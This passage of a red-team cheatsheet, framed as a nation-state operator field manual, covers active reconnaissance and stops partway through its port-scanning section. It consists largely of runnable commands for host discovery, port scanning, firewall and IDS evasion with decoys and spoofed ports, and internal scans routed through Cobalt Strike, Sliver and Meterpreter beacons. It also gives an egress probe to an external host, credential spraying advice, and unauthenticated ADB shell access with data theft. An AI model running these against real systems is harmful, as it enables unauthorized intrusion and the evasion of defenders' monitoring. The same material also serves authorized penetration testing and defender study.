# Active Reconnaissance — Nation-State Operator Field Manual

> **Classification:** Comprehensive active reconnaissance reference for APT operations. Every technique INTERACTS with target systems — every packet is potentially logged. Mapped to MITRE ATT&CK TA0043 (Reconnaissance — pre-access subset) and TA0007 (Discovery — post-access). Assumes passive recon (`01-passive-recon-cheatsheet.md`) is already complete.
>
> **Environment baseline:** Modern enterprise — Windows 10/11 + Server 2019/2022/**2025**, MDE-class EDR with AMSI/ETW/ASR/Tamper Protection/LSA Protection/Credential Guard, hybrid Entra ID with Conditional Access + PIM + MFA + Identity Protection, on-prem AD with tiering/LAPS/gMSA/Protected Users, **Microsoft Defender for Identity (MDI)** monitoring DCs (or comparable: Vectra, ExtraHop Reveal(x), Darktrace), **Defender for Cloud Apps (MDCA)** for SaaS visibility, SIEM correlation (Sentinel/Splunk/Elastic), 24/7 SOC with automated containment (host isolation + user disable on high-confidence alerts), egress filtering, DNS logging, network segmentation, NDR (Network Detection & Response — Vectra/Darktrace/ExtraHop) on north-south + east-west, CSPM (Wiz/Lacework/Orca) for cloud-side detection.
>
> **Active recon noise taxonomy:** Every technique here is at minimum **TARGET-TOUCH**. Each is rated on a 6-level NOISE scale:
> - **NEAR-ZERO** — single packet / handshake; indistinguishable from normal traffic
> - **LOW** — small probe set; below typical IDS thresholds
> - **MEDIUM** — moderate probe set; within IDS detection capability but rarely correlated/alerted
> - **HIGH** — clear scan signature; SIEM rules typically fire; SOC triage triggered
> - **VERY HIGH** — automated SOC response (host containment, source-IP blocklist)
> - **EXTREME** — DDoS-mitigation triggered; near-instant block + investigation

---

### Support This Work

If these cheatsheets save you time, consider buying me a coffee.

<a href="https://www.buymeacoffee.com/NoVanity" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>

**Or scan:**

<img src="https://github.com/MentalVibes/RedTeamCheatSheets/blob/4077a94d94806ba6e6513c29e1410bcda23894d1/qr-code.png" alt="Buy Me A Coffee QR" width="200">

**Crypto:**

| Currency | Address |
|----------|---------|
| **ETH** | `0x3844c08bb832b086d00dbbfec128cb31bdcca838` |

*Accepts ETH, USDC, and any ERC-20 token on Ethereum, Base, Polygon, and other EVM chains.*

---

## Table of Contents

- [0 — Methodology & OPSEC Framework](#0--methodology--opsec-framework)
- [1 — Host Discovery](#1--host-discovery)
- [2 — Port Scanning](#2--port-scanning)
- [3 — Service & Application Enumeration](#3--service--application-enumeration)
- [4 — Edge / VPN Appliance Fingerprinting](#4--edge--vpn-appliance-fingerprinting)
- [5 — Web Application Reconnaissance](#5--web-application-reconnaissance)
- [6 — Cloud Asset Enumeration](#6--cloud-asset-enumeration)
- [7 — ICS / OT Discovery](#7--ics--ot-discovery)
- [8 — Vulnerability Scanning](#8--vulnerability-scanning)
- [9 — OPSEC & Detection Reference](#9--opsec--detection-reference)
- [10 — Tool Quick Reference (Maintenance Status)](#10--tool-quick-reference-maintenance-status)
- [11 — MITRE ATT&CK Mapping Matrix](#11--mitre-attck-mapping-matrix)

---

## 0 — METHODOLOGY & OPSEC FRAMEWORK

```
═══════════════════════════════════════════════════════════
PHASED ACTIVE RECONNAISSANCE WORKFLOW
═══════════════════════════════════════════════════════════
PREREQ: Passive recon (01-passive-recon-cheatsheet.md) complete.
        Target inventory built. Asset prioritization done.

PHASE 1: EXTERNAL SURFACE MAPPING (from internet, pre-engagement position)
├── Subdomain enumeration  (active brute, vhost discovery on resolved IPs)
├── Port scanning          (external-facing hosts — distributed, slow, evasive)
├── Service fingerprinting (version detection on discovered ports)
├── Edge-appliance recognition (Ivanti / Fortinet / Citrix / Palo Alto / Cisco)
├── Web application discovery (directories, technologies, APIs, GraphQL, gRPC)
├── Cloud asset enumeration (S3/Blob/GCS, Lambda URLs, Cloud Run, K8s, Vault)
└── TLS/JARM analysis      (cert SANs reveal internal names; JARM reveals stack)

PHASE 2: VULNERABILITY IDENTIFICATION (prioritized scanning)
├── Edge-appliance CVE quick-recognition (2024-2026 mass-exploit matrix)
├── Nuclei v3 against discovered services (severity-tagged, technology-targeted)
├── Default credentials on exposed mgmt interfaces (Grafana, Jenkins, RabbitMQ)
├── Known CVE matching against identified versions
├── Authenticated web app scanning (where creds obtained)
└── Cloud misconfiguration checks (CSPM-equivalent in operator-side)

PHASE 3: INTERNAL NETWORK MAPPING (post-initial-access)
├── Host discovery (ARP/mDNS/WSD/SSDP/passive listeners)
├── Targeted port scan of discovered hosts (NEVER full-range internal sweep)
├── AD enumeration (BloodHound CE, NetExec, BloodyAD, AzureHound for Entra)
├── Service enumeration (SMB shares, MSSQL, NFS, SNMP, Veeam/vCenter pivots)
└── Identify Tier 0 assets (DCs, CAs, file servers, jump hosts, backup infra)

PHASE 4: IDENTITY-PLANE ENUMERATION (parallel to Phase 3)
├── Entra outsider recon (cross-ref passive recon §7.3)
├── Username validation against M365 / Okta / Auth0 (response-time analysis)
├── ADFS endpoint discovery (sts.target.com/adfs/services/trust)
├── Federation chain mapping
└── AzureHound / ROADrecon (with creds) — service-principal + role enum
```

```
═══════════════════════════════════════════════════════════
QUICK DECISION TREE — WHICH CLASS OF TECHNIQUE?
═══════════════════════════════════════════════════════════
EXTERNAL POSITION + NO CREDS + LOW DETECTION TOLERANCE:
  → DNS-based recon + single-port HTTPS handshakes (NEAR-ZERO noise)
  → Pull edge-appliance fingerprints from Shodan (passive recon §2.3),
    NOT from direct probes
  → Single Nmap -sS against confirmed hosts on 22/80/443/3389/8443 only

EXTERNAL POSITION + NO CREDS + MEDIUM DETECTION TOLERANCE:
  → Targeted Nmap -sS -sV -p <known-ports> with --max-rate 50
  → Naabu fast-SYN against discovered ranges → handoff to Nmap for -sV
  → Web tech fingerprinting (httpx, whatweb) — single HTTPS per host
  → Edge appliance CVE matrix probes (one-shot per host)

EXTERNAL POSITION + WITH CREDS (e.g., breach reuse from passive recon §6):
  → Validate creds against M365/Okta with low-and-slow spray (1 attempt/15min)
  → Use creds for authenticated cloud enum (AzureHound, ROADrecon, ScoutSuite)
  → Direct API access bypasses much network-layer detection

INTERNAL POSITION + LOW DETECTION TOLERANCE:
  → ARP scan local subnet (NEAR-ZERO; routine traffic)
  → Responder -A passive listen for LLMNR/NBT-NS/mDNS broadcasts
  → Targeted enumeration via existing C2 (single-port checks per host)
  → BloodHound CE collection with -CollectionMethod LoggedOn,Trusts (minimal
    — NOT All / Session)

INTERNAL POSITION + WITH DOMAIN CREDS:
  → BloodHound CE full collection (acceptable noise; routine LDAP)
  → NetExec across known IP ranges with -u/-p
  → Veeam / vCenter / SolarWinds discovery (highest-value internal pivots)
  → Identity-plane: ADFS endpoint enum, AzureHound for tied-Entra tenant

NEVER:
  → Full -p- internal sweep without explicit RoE authorization
  → Nessus/OpenVAS/Qualys against ICS/OT (can BRICK PLCs)
  → Authenticated AWS/Azure/GCP enumeration without CloudTrail/AAL awareness
    (every API call logged; unauthorized recon = breach-of-engagement risk)
```

```
═══════════════════════════════════════════════════════════
OPSEC NOISE HIERARCHY (quietest → noisiest)
═══════════════════════════════════════════════════════════
NOISE: NEAR-ZERO  — Pure passive listeners (Responder -A, ARP listen),
                    DNS lookups via public resolvers, single-cert TLS handshakes
NOISE: LOW        — ARP scan local subnet, single Nmap -sS to specific ports,
                    one-shot HTTPS to known-cataloged hosts
NOISE: MEDIUM     — Targeted Nmap -sV against known port set, dirbust at
                    --threads <= 5, controlled DNS brute force
NOISE: HIGH       — Nmap full TCP -p- (65535 ports × N hosts),
                    Nuclei against many targets, dirbust at --threads 50+
NOISE: VERY HIGH  — NSE -sC --script vuln, mass DNS brute (-w 100k+),
                    full UDP scan (-sU -p-), unauth K8s API enumeration
NOISE: EXTREME    — Masscan/ZMap large-range, Nessus/OpenVAS/Qualys,
                    automated DAST (Burp Pro Active Scan, ZAP automation)
```

```
═══════════════════════════════════════════════════════════
MODERN DETECTION SURFACE (2026 enterprise baseline)
═══════════════════════════════════════════════════════════
NETWORK LAYER:
  ├── Firewall connection logs           Active flows per source IP
  ├── IDS/IPS (Snort/Suricata signatures) Scan-pattern matches
  ├── NetFlow / IPFIX                    Flow-volume anomalies
  ├── DNS logging                        Query-volume + brute-force patterns
  ├── NDR (Vectra / Darktrace / ExtraHop) East-west scan + lateral movement
  └── WAF (Cloudflare / Akamai / etc.)   HTTP probe patterns + scanner UAs

ENDPOINT LAYER:
  ├── EDR (MDE / CrowdStrike / S1)       Process / network / file telemetry
  ├── ETW providers (TI / kernel / etc.) Sub-process behavior
  ├── PowerShell logging (script block)  Cmdlet enumeration patterns
  ├── Sysmon (where deployed)            Process / thread / image events
  └── EDR-as-network-sensor              Internal scans observed via host

IDENTITY LAYER:
  ├── Defender for Identity (MDI)        DC traffic — Kerberos, LDAP, DCSync
  ├── Entra Sign-in logs                 Auth attempts + risk scoring
  ├── Entra Identity Protection          Atypical sign-in / impossible travel
  ├── Defender for Cloud Apps (MDCA)     SaaS-side anomaly + session
  └── Conditional Access policy logs     Block + challenge events

CLOUD LAYER:
  ├── AWS CloudTrail                     EVERY API call, including read-only
  ├── Azure Activity Log + Resource Logs Subscription + resource events
  ├── GCP Cloud Audit Logs               Admin Activity + Data Access
  ├── CSPM (Wiz / Lacework / Orca)       Misconfiguration + active recon
  └── KMS / IAM auditing                 Key access + role assumption

XDR CORRELATION (the real defender capability):
  Single events benign. XDR chains: scan → failed auth → identity event →
  endpoint anomaly → cross-tenant access → automated containment.
  Modern operator must consider what CHAINS, not what individual events fire.
```

---

## 1 — HOST DISCOVERY

> **Typical chains through this section:** External DNS-driven discovery → ASN/IP-range enumeration (passive recon §2) → targeted host probes → internal Layer 2 + 3 + passive listener combination → C2-routed scans for hardest-to-detect internal mapping.

### 1.1 — External Host Discovery (from Internet)

```bash
# ═══════════════════════════════════════════════════════════
# DNS-DRIVEN EXTERNAL DISCOVERY
# MITRE ATT&CK: T1595.001 (Active Scanning: IP Blocks),
#               T1590.005 (Gather Victim Network: IP Addresses)
# NOISE LEVEL:  LOW (DNS queries blend; brute-force is the noisy part)
# DETECTION (target):     Authoritative DNS may see resolver-source queries
# DETECTION (third-party): Public resolvers see your IP; distribute across
#                          multiple resolvers + add jitter
# ═══════════════════════════════════════════════════════════
# Active subdomain brute force (use AFTER passive sources from §1.1
# of passive recon are exhausted — passive yields most subdomains)
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -silent -resp -o dns_brute.txt

# Resolve passive-discovered subdomains to IPs
cat all_subdomains.txt | dnsx -a -resp -silent -o resolved_ips.txt

# DNS-only mapping of IP range (zero packets to targets)
nmap -sL 203.0.113.0/24 | grep "report for" | awk '{print $5, $6}'

# Reverse DNS sweep (one PTR query per IP)
for i in $(seq 1 254); do
  dig @8.8.8.8 -x 203.0.113.$i +short
done

# Permutation-based active brute (wordlist + alterations)
alterx -l subdomains.txt -enrich | dnsx -resp -silent

# Targeted Nmap list scan (DNS resolution only, NO probes)
nmap -sL 203.0.113.0/24 -oA dns_only_resolution
```

### 1.2 — Internal Layer 2 Discovery

```bash
# ═══════════════════════════════════════════════════════════
# ARP SCAN — LOCAL SUBNET ONLY (Layer 2)
# MITRE ATT&CK: T1018 (Remote System Discovery)
# NOISE LEVEL:  NEAR-ZERO to LOW (ARP is routine; mass-ARP from one host
#               can be detected by NAC if behavioral baselining enabled)
# DETECTION:    NAC (Forescout, ClearPass, ISE) — anomalous ARP patterns
#               EDR may observe nmap process; not the network behavior
# ═══════════════════════════════════════════════════════════
sudo nmap -sn -PR 10.0.0.0/24                # ARP ping only (Nmap)
sudo netdiscover -r 10.0.0.0/24              # Active ARP scan
sudo netdiscover -p                           # PASSIVE — listen-only, no TX
sudo arp-scan -l                              # Local subnet
sudo arp-scan --interface=eth0 10.0.0.0/24

# arping per-host (single ARP query — quietest)
sudo arping -c 1 -w 1 10.0.0.5

# ═══════════════════════════════════════════════════════════
# mDNS / DNS-SD ACTIVE QUERIES (Bonjour / Avahi)
# MITRE ATT&CK: T1046 (Network Service Discovery)
# NOISE LEVEL:  LOW — multicast traffic; common on LANs with
#               printers / Apple devices / IoT
# ═══════════════════════════════════════════════════════════
# avahi-browse (Linux-side mDNS browser)
avahi-browse -art                             # All services, resolve, terminate
avahi-browse -d local _services._dns-sd._udp -t

# dns-sd (macOS-native; also packaged in Avahi on Linux)
dns-sd -B _services._dns-sd._udp local.       # Discover service types
dns-sd -B _http._tcp local.                   # Discover HTTP services
dns-sd -B _ssh._tcp local.                    # Discover SSH-advertising hosts
dns-sd -B _smb._tcp local.                    # Discover SMB-advertising hosts
dns-sd -B _ipp._tcp local.                    # Discover IPP printers
dns-sd -B _printer._tcp local.                # Discover legacy LPD printers
dns-sd -B _airplay._tcp local.                # Apple AirPlay devices
dns-sd -B _hap._tcp local.                    # Apple HomeKit devices

# Nmap mDNS probe (sends a single multicast query)
nmap --script=dns-service-discovery -p 5353 224.0.0.251

# ═══════════════════════════════════════════════════════════
# WSD (Web Services for Devices / WS-Discovery)
# MITRE ATT&CK: T1046 (Network Service Discovery)
# NOISE LEVEL:  LOW — multicast traffic; common on Windows networks
#               for printer / device auto-discovery
# ═══════════════════════════════════════════════════════════
# WSD probe via Nmap NSE
nmap --script=broadcast-ws-discovery -e eth0

# Manual WSD probe (UDP 3702 multicast 239.255.255.250)
# wsdd2 / py-wsd projects provide programmatic enumeration

# ═══════════════════════════════════════════════════════════
# SSDP (Simple Service Discovery Protocol — UPnP)
# MITRE ATT&CK: T1046 (Network Service Discovery)
# NOISE LEVEL:  LOW — UPnP discovery; common on networks with
#               IoT devices, smart TVs, conference equipment
# ═══════════════════════════════════════════════════════════
# Nmap SSDP probes
nmap --script=broadcast-upnp-info -e eth0
nmap --script=upnp-info -p 1900 <target>

# Manual M-SEARCH probe (UDP 1900 multicast 239.255.255.250)
# upnpc -m eth0 -l   (miniupnpc tool)

# ═══════════════════════════════════════════════════════════
# NETBIOS NAME RESOLUTION (legacy Windows networks)
# MITRE ATT&CK: T1018 (Remote System Discovery)
# NOISE LEVEL:  LOW — NetBIOS name queries; legacy but still common
# ═══════════════════════════════════════════════════════════
nbtscan -r 10.0.0.0/24                        # NetBIOS scan
nbtscan -v 10.0.0.5                           # Verbose single host
sudo nmap --script=nbstat -p 137 10.0.0.0/24  # Nmap NetBIOS NS
nmblookup -A 10.0.0.5                         # Samba NetBIOS lookup
```

### 1.3 — Internal Layer 3 Discovery

```bash
# ═══════════════════════════════════════════════════════════
# ICMP / TCP / UDP PING SWEEP
# MITRE ATT&CK: T1018 (Remote System Discovery), T1046
# NOISE LEVEL:  MEDIUM — modern IDS/NDR detect ping sweeps trivially;
#               IDS signature: "ICMP echo request from same source to
#               many destinations within short window"
# DETECTION:    Snort/Suricata default rules; Vectra detects east-west
#               ICMP enumeration; Defender for Identity does NOT see
#               this (DC-traffic only) — but EDR on the source DOES
# ═══════════════════════════════════════════════════════════
# Nmap ping sweep variants
nmap -sn 10.0.0.0/24                          # ICMP echo + TCP 80/443 + ARP
nmap -sn -PE -PP -PM 10.0.0.0/24              # ICMP echo + timestamp + netmask
nmap -sn -PS22,80,135,443,445,3389 10.0.0.0/24 # TCP SYN ping
nmap -sn -PA80,443 10.0.0.0/24                # TCP ACK ping (bypasses some FW)
nmap -sn -PU53,161,500 10.0.0.0/24            # UDP ping (DNS, SNMP, IKE)

# Skip ping (when ICMP blocked — assume host alive, scan ports anyway)
nmap -Pn -sS -p 22,80,135,443,445,3389,5985 10.0.0.0/24

# fping fast ICMP sweep (lower-overhead than nmap)
fping -a -g 10.0.0.0/24 2>/dev/null

# hping3 single TCP probe (most flexible; per-flag control)
sudo hping3 -S -p 445 -c 1 10.0.0.5

# Naabu (ProjectDiscovery's port scanner, also does host discovery)
naabu -host 10.0.0.0/24 -ping -silent
```

### 1.4 — Passive Listeners (NEAR-ZERO NOISE)

```bash
# ═══════════════════════════════════════════════════════════
# RESPONDER ANALYZE MODE — ZERO TRANSMITTED PACKETS
# MITRE ATT&CK: T1040 (Network Sniffing) — adjacent
# NOISE LEVEL:  NEAR-ZERO — receive-only; only host-local network capture
# DETECTION (target): None at network layer; EDR may flag responder.py
#                     process execution if signatured
# ═══════════════════════════════════════════════════════════
# Captures LLMNR (5355), NBT-NS (137), mDNS (5353) broadcasts
# Reveals: live hosts, hostnames, domain names, services — without
# sending a single probe
sudo responder -i eth0 -A
# -A = analyze-only (do NOT respond / poison)
# -i = interface

# What you'll see in console output:
# [Analyze mode: LLMNR] Request from <IP> for <hostname>
# [Analyze mode: NBT-NS] Request from <IP> for <hostname>
# [Analyze mode: mDNS] Request from <IP> for <service>
# [Analyze mode: SMB] Hash captured (read-only — not poisoning)

# For IPv6 networks: use Inveigh in PowerShell (Windows-side equivalent)
# Inveigh -ConsoleOutput Y -SpooferIP 0.0.0.0 -SpooferReply Off

# ═══════════════════════════════════════════════════════════
# ARP / DHCP PASSIVE OBSERVATION
# MITRE ATT&CK: T1040 (Network Sniffing)
# NOISE LEVEL:  NEAR-ZERO
# ═══════════════════════════════════════════════════════════
# Capture all ARP and DHCP traffic to map active hosts
sudo tcpdump -i eth0 -n 'arp or (port 67 or port 68)' -w passive_arp_dhcp.pcap

# Wireshark filter equivalents:
#   arp                   - all ARP
#   dhcp                  - DHCPv4 traffic
#   ipv6 and udp.port==547 - DHCPv6
```

### 1.5 — C2-Routed Internal Scans (Post-Foothold)

```
═══════════════════════════════════════════════════════════
INTERNAL RECON THROUGH EXISTING C2 — HIGHEST OPSEC
MITRE ATT&CK: T1018 (Remote System Discovery), T1046, T1135
NOISE LEVEL:  LOW — traffic appears from a legitimate internal host
DETECTION:    EDR on compromised host observes scan-like behavior;
              network-layer detection sees "normal user-host activity"
              UNLESS pattern correlation (rare) is in play
═══════════════════════════════════════════════════════════
WHY THIS MATTERS: Operator infrastructure is OUTSIDE the network. Routing
all internal recon through a beacon on a compromised host means:
  - Every network packet originates from a "trusted" internal source
  - Source IP matches expected user-host activity for that subnet
  - No new outbound C2 channel needed
  - EDR-on-compromised-host is the ONLY layer that sees the actual scan

IMPLEMENTATION PER FRAMEWORK:

Cobalt Strike:
  beacon> portscan 10.0.0.0/24 1-1024,3389,5985,6443,8080,8443,9090 arp
  beacon> net view              # SMB-based host enum
  beacon> net domain_controllers
  beacon> net dclist

Sliver:
  sliver> network scan tcp 10.0.0.0/24 -p 22,80,135,443,445,3389,5985,6443,8080
  sliver> portfwd add -r 10.0.0.5:445 -b 0.0.0.0:8445  # Pivot

Havoc:
  demon> portscan tcp 10.0.0.0/24 22,80,443,445,3389,5985

Mythic:
  Apollo / Athena / Poseidon agents have built-in network-enum modules

Meterpreter:
  meterpreter> run autoroute -s 10.0.0.0/24
  meterpreter> use auxiliary/scanner/portscan/tcp
  meterpreter> set RHOSTS 10.0.0.0/24
  meterpreter> set PORTS 22,80,443,445,3389,5985

PowerShell living-off-the-land (no upload required):
  1..254 | % { Test-NetConnection -ComputerName 10.0.0.$_ -Port 445 `
       -WarningAction SilentlyContinue | ? {$_.TcpTestSucceeded} | `
       select ComputerName,RemotePort }

  # Target ports check across subnet
  foreach ($ip in 1..254) {
      foreach ($port in 22,445,3389,5985,8080) {
          $r = Test-NetConnection 10.0.0.$ip -Port $port -WarningAction SilentlyContinue
          if ($r.TcpTestSucceeded) { "$($r.ComputerName):$port" }
      }
  }

cmd.exe (no PowerShell):
  for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i ^| find "Reply" `
      ^&^& echo 10.0.0.%i is alive

WMI internal recon (no PowerShell, no scan tools — least signatured):
  Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=true"
  Get-WmiObject -Class Win32_ComputerSystem
  wmic computersystem get domain,model,name,manufacturer
  wmic /node:10.0.0.5 computersystem get name,domain  # Remote query (auth needed)

ADSI living-off-the-land (cleanest internal AD recon):
  $searcher = [adsisearcher]"(objectClass=computer)"
  $searcher.PageSize = 500
  $searcher.FindAll() | % { $_.Properties.dnshostname }
```

### 1.6 — Network Segmentation Discovery

```bash
# ═══════════════════════════════════════════════════════════
# PINHOLE MAPPING / FIREWALL RULE INFERENCE
# MITRE ATT&CK: T1046 (Network Service Discovery), T1018
# NOISE LEVEL:  MEDIUM (controlled probes); HIGH (broad scans)
# ═══════════════════════════════════════════════════════════
# Determine which destination ports/protocols traverse segmentation by
# probing a known-listening external host from various source ports

# Outbound port enumeration FROM compromised host (which egress allowed?)
for port in 21 22 23 25 53 80 443 445 1080 3128 3389 5985 8080 8443 9001 9050; do
  timeout 2 bash -c "</dev/tcp/<EXTERNAL_TEST_HOST>/$port" 2>/dev/null && echo "$port OUT"
done

# Source-port spoofing inference (which source ports bypass FW?)
# Common bypasses: src 53 (DNS), src 88 (Kerberos), src 123 (NTP)
sudo nmap --source-port 53 -sS -p 22,80,443 <DEST>
sudo nmap --source-port 88 -sS -p 22,80,443 <DEST>

# TTL analysis for hop-count inference (find appliances in path)
hping3 -1 -c 5 -t 1 <target>; hping3 -1 -c 5 -t 2 <target>  # ...up to N
# Or use traceroute with low TTLs
traceroute -n -m 30 <target>

# Path MTU discovery for tunnel detection
# Inconsistent MTU often reveals VPN encapsulation upstream
ping -M do -s 1472 <target>      # 1472 + 28 (ICMP) = 1500 (Ethernet MTU)
# Decrement until packet succeeds; resulting MTU reveals tunneling
```

### 1.7 — Android Debug Bridge (ADB) Over Network

```bash
# ═══════════════════════════════════════════════════════════
# ADB ON TCP 5555 — UNAUTH SHELL ACCESS TO ANDROID DEVICES
# MITRE ATT&CK: T1046 (Network Service Discovery), T1078 (Valid Accounts)
# NOISE LEVEL:  LOW for probe; HIGH (RCE-equivalent) if connection succeeds
# ═══════════════════════════════════════════════════════════
# Common on rooted phones, IoT gateways with ADB enabled, smart-TV
# environments, factory-test images shipped to production. Discovery
# during an internal engagement frequently yields immediate root shell.

# Probe for ADB
nmap -p 5555 --script=adb-info 10.0.0.0/24

# Connect (NO AUTH REQUIRED if ADB-over-network is enabled)
adb connect 10.0.0.5:5555
adb -s 10.0.0.5:5555 shell

# What you can do once connected (typical):
# - Run arbitrary shell commands (root on rooted devices, shell user otherwise)
# - Pull all device data (`adb pull /sdcard/`)
# - Install arbitrary APKs (`adb install <pkg>.apk`)
# - Port-forward through device (`adb forward tcp:8080 tcp:80`)
# - Reboot to bootloader (`adb reboot bootloader`)

# Note: Google has reduced default ADB-over-network availability since
# Android 11; still common on:
#   - Rooted developer / power-user devices
#   - Smart TVs (Sony / TCL / Roku Android TV)
#   - IoT hub gateways (factory-test images)
#   - Industrial / kiosk Android devices
#   - Cheap unbranded tablets used in retail / healthcare
```

```
═══════════════════════════════════════════════════════════
SECTION 1 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §2 port scanning (host inventory feeds targeted port enum)
Enables → §3 service enumeration (host list seeds per-protocol queries)
Enables → §4 edge-appliance fingerprinting (external host inventory)
Prereq → Passive recon §1 (passive subdomain inventory + ASN/IP map)
Cross-ref → §1.5 C2-routed scans use same techniques as 1.2/1.3 but routed
            through compromised host for OPSEC
Alternative → If external-position scans burn fast, pivot to passive-only
              recon (passive recon §2.3 Shodan/Censys facets) until
              foothold obtained
```

---

## 2 — PORT SCANNING

> **Typical chains through this section:** Naabu fast-SYN sweep → Nmap -sV against discovered ports → NSE for service-specific deep enumeration → handoff to §3 protocol-specific tools. For internal: ARP/Responder first, THEN scan only confirmed-alive hosts.

### 2.1 — Nmap (Stealth / Balanced / Speed Profiles)

```bash
# ═══════════════════════════════════════════════════════════
# NMAP — TUNED FOR ENGAGEMENT CONTEXT
# MITRE ATT&CK: T1595.001 (Active Scanning: IP Blocks)
# NOISE LEVEL:  Variable — see per-profile
# DETECTION:    IDS "port scan" signatures (Snort SID 17050, Suricata
#               equivalents); NDR detects fan-out per source IP
# ═══════════════════════════════════════════════════════════

# ─── MAXIMUM STEALTH (NOISE: LOW) ───────────────────────────
# External engagement, target-side IDS suspected, broad fingerprint to avoid
nmap -sS -T1 --max-rate 10 --scan-delay 5s --randomize-hosts \
     -p 22,80,443,3389,8443 <targets> -oA stealth_scan

# Even quieter — single port, single packet, single host
nmap -sS -p 443 -Pn -n --max-retries 0 --host-timeout 30s <target>

# ─── BALANCED (NOISE: MEDIUM) ───────────────────────────────
# Internal post-foothold; moderate detection tolerance
nmap -sS -T3 --min-rate 500 --max-retries 2 -Pn \
     -p 22,80,135,139,443,445,3306,3389,5985,5986,8080,8443 <target> -oA balanced

# ─── MAXIMUM SPEED (NOISE: HIGH) ────────────────────────────
# Internal, detection-tolerant, time-pressured
nmap -sS -T5 --min-rate 10000 -Pn -p- <target> -oA fast_full
# Or hand off to Naabu (faster) for initial discovery → Nmap for -sV

# ─── COMPREHENSIVE BUT NOISY ────────────────────────────────
# Full TCP + version + safe scripts
nmap -sS -sV -sC -p- -T4 -Pn <target> -oA full_scan

# UDP scan (slow but critical — many services UDP-only)
sudo nmap -sU --top-ports 50 -T4 <target> -oA udp_top50
sudo nmap -sU -p 53,67,69,88,123,137,161,162,500,514,520,1900,5353,11211 <target>

# Combined TCP + UDP (full coverage)
sudo nmap -sS -sU -p T:1-65535,U:53,67,69,88,123,137,161,500,514,1900 <target>

# Scan a list of hosts (input file)
nmap -sS -sV -p 80,443 -iL targets.txt -oA list_scan
```

### 2.2 — Naabu (Modern Fast SYN Scanning)

```bash
# ═══════════════════════════════════════════════════════════
# NAABU — PROJECTDISCOVERY FAST PORT SCANNER
# MITRE ATT&CK: T1595.001
# NOISE LEVEL:  HIGH (similar to Nmap fast modes; built for throughput)
# DETECTION:    Same as Nmap — fan-out from single source IP
# ═══════════════════════════════════════════════════════════
# v2.5.0+ as of March 2026; preferred over RustScan in modern pipelines
# for library-integrability with the rest of the ProjectDiscovery suite

# Top-100 ports (fast initial sweep)
naabu -host <target> -top-ports 100 -silent -o naabu_top100.txt

# Custom port set
naabu -host <target> -p 22,80,443,3389,5985,8080,8443 -silent

# Full TCP scan (1-65535)
naabu -host <target> -p - -rate 5000 -silent -o naabu_full.txt

# Range scan + Nmap handoff for service detection (preferred pipeline)
naabu -host <target> -top-ports 1000 -silent -o open_ports.txt
nmap -sS -sV -sC -p $(cat open_ports.txt | cut -d: -f2 | paste -sd,) <target>

# Naabu against subdomain list (port-scan thousands of hosts in pipeline)
cat resolved_ips.txt | naabu -top-ports 100 -silent -rate 2000 \
     -o all_open_ports.txt

# Naabu Nmap-on-discovery mode (passes to nmap -sV automatically)
naabu -host <target> -top-ports 100 -nmap-cli "nmap -sV -sC -oN nmap.txt"
```

### 2.3 — Masscan / ZMap / ZGrab2 (Ultra-Fast IPv4)

```bash
# ═══════════════════════════════════════════════════════════
# MASSCAN — EXTREME-RATE SYN SCANNER
# MITRE ATT&CK: T1595.001
# NOISE LEVEL:  EXTREME — appears as DDoS to defenders;
#               DDoS-mitigation triggers + automatic source blocklist
# ═══════════════════════════════════════════════════════════
# Use ONLY when you have explicit RoE, OR for rapid IPv4-wide discovery
# from short-lived attribution-distant infrastructure
sudo masscan 10.0.0.0/16 -p 0-65535 --rate 10000 -oG masscan_results.gnmap
sudo masscan -p 80,443,8080,8443 0.0.0.0/0 --rate 100000 \
     --excludefile excludelist.txt -oG masscan_internet.gnmap

# Throttled masscan (less likely to trigger DDoS mitigation)
sudo masscan 10.0.0.0/16 -p 80,443 --rate 1000 -oG masscan_throttled.gnmap

# ═══════════════════════════════════════════════════════════
# ZMAP / ZGRAB2 — INTERNET-SCALE SCANNING (academic-grade)
# MITRE ATT&CK: T1595.001
# NOISE LEVEL:  EXTREME
# ═══════════════════════════════════════════════════════════
# ZMap discovers hosts; ZGrab2 fetches application-layer data (banners, certs)
# ZMap v4.3.4+ as of April 2026; ZGrab v1 deprecated in favor of v2

# Single-port internet sweep (research-grade speed)
sudo zmap -p 443 -B 10M -o zmap_443.txt -b zmap_blocklist.conf

# Banner grab on discovered hosts
zgrab2 http -p 443 --use-https -o zgrab_https.json < zmap_443.txt
zgrab2 ssh -p 22 -o zgrab_ssh.json < discovered.txt
zgrab2 tls -p 443 -o zgrab_tls.json < discovered.txt
```

### 2.4 — Firewall Evasion

```bash
# ═══════════════════════════════════════════════════════════
# NMAP EVASION TECHNIQUES
# NOISE LEVEL:  Variable — fragmentation reduces signature match,
#               doesn't reduce traffic volume
# DETECTION:    Modern IDS reassemble fragments; modern WAF tracks
#               cumulative request patterns regardless of fragmentation
# ═══════════════════════════════════════════════════════════
nmap -f <target>                              # 8-byte fragments
nmap -ff <target>                             # 16-byte fragments
nmap --mtu 24 <target>                        # Custom MTU (multiple of 8)
nmap -D RND:10 <target>                       # 10 random decoys
nmap -D 192.168.1.5,192.168.1.10,ME <target>  # Specific decoys + your IP
nmap --source-port 53 <target>                # Spoof source port (DNS)
nmap --source-port 88 <target>                # Spoof source port (Kerberos)
nmap --source-port 123 <target>               # Spoof source port (NTP)
nmap --data-length 50 <target>                # Append random data
nmap -sS --scan-delay 5s <target>             # Slow timing
nmap --spoof-mac 0 <target>                   # Random MAC (Layer 2 only)
nmap --badsum <target>                        # Detect FW (drops bad checksums)

# Idle scan (zombie scan — packets appear from a third-party host)
# Requires zombie host with predictable IP ID sequence (rare in 2026)
nmap -sI <zombie_ip> <target>

# Source address spoofing (rare; requires raw-socket position)
nmap -e eth0 -S <spoofed_ip> -Pn <target>     # Asymmetric — won't see replies
```

### 2.5 — Output Parsing Pipeline

```bash
# ═══════════════════════════════════════════════════════════
# NMAP OUTPUT FORMATS + DOWNSTREAM PIPELINE
# ═══════════════════════════════════════════════════════════
nmap -oA scan_results <target>                # All formats simultaneously

# Extract IPs with any open port
grep "open" scan.gnmap | awk '{print $2}'

# Extract IPs with specific port (e.g., 445 SMB)
grep "445/open" scan.gnmap | awk '{print $2}'

